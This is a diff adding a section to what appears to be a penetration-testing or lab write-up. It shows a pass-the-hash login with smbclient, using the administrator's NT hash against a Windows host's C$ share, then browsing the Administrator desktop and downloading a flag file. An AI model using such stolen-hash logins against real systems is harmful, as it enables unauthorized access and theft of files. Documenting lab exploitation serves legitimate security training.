@@ -533,3 +533,44 @@ SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\administ
 ```
 The administrator has now been compromised on the windows workstation
 
+```python
+smbclient \\\\EC2AMAZ-NS87CNK.hsm.local\\C$ -U 'administrator'%'d5cad8a9782b2879bf316f56936f1e36' --pw-nt-hash
+Try "help" to get a list of possible commands.
+smb: \> ls
+  $Recycle.Bin                      DHS        0  Tue Nov 18 19:41:17 2025
+  $WINRE_BACKUP_PARTITION.MARKER     AH        0  Wed Mar 12 10:49:29 2025
+  Documents and Settings          DHSrn        0  Wed Nov 13 17:27:46 2024
+  DumpStack.log.tmp                 AHS    12288  Tue Mar 17 14:27:36 2026
+  inetpub                             D        0  Wed Mar 12 11:02:28 2025
+  pagefile.sys                      AHS 1207959552  Tue Mar 17 14:27:36 2026
+  PerfLogs                            D        0  Mon Apr  1 08:02:26 2024
+  Program Files                      DR        0  Thu Nov 14 01:26:15 2024
+  Program Files (x86)                DR        0  Mon Apr  1 09:16:25 2024
+  ProgramData                       DHn        0  Sun Nov 30 13:15:36 2025
+  Recovery                           DH        0  Fri Nov 14 19:30:48 2025
+  Share                               D        0  Tue Mar 17 16:36:49 2026
+  System Volume Information         DHS        0  Fri Nov 14 19:33:15 2025
+  Temp                                D        0  Tue Mar 17 16:09:47 2026
+  Users                              DR        0  Tue Nov 18 19:21:51 2025
+  Windows                             D        0  Tue Mar 17 16:36:45 2026
+
+		7731967 blocks of size 4096. 2777771 blocks available
+smb: \> cd Users/Administrator/Desktop
+smb: \Users\Administrator\Desktop\> diur
+diur: command not found
+smb: \Users\Administrator\Desktop\> dir
+  .                                  DR        0  Tue Nov 18 19:21:10 2025
+  ..                                  D        0  Fri Nov 14 19:33:26 2025
+  desktop.ini                       AHS      282  Tue Nov 18 11:32:08 2025
+  EC2 Feedback.url                    A      470  Thu Nov 14 01:03:10 2024
+  EC2 Microsoft Windows Guide.url      A      501  Thu Nov 14 01:03:10 2024
+  Microsoft Edge.lnk                  A     2351  Tue Nov 18 11:45:40 2025
+  user2.txt                           A      118  Wed Nov 19 13:01:27 2025
+
+		7731967 blocks of size 4096. 2777771 blocks available
+smb: \Users\Administrator\Desktop\> type user.txt
+type: command not found
+smb: \Users\Administrator\Desktop\> get user2.txt 
+getting file \Users\Administrator\Desktop\user2.txt of size 118 as user2.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+smb: \Users\Administrator\Desktop\>
+```
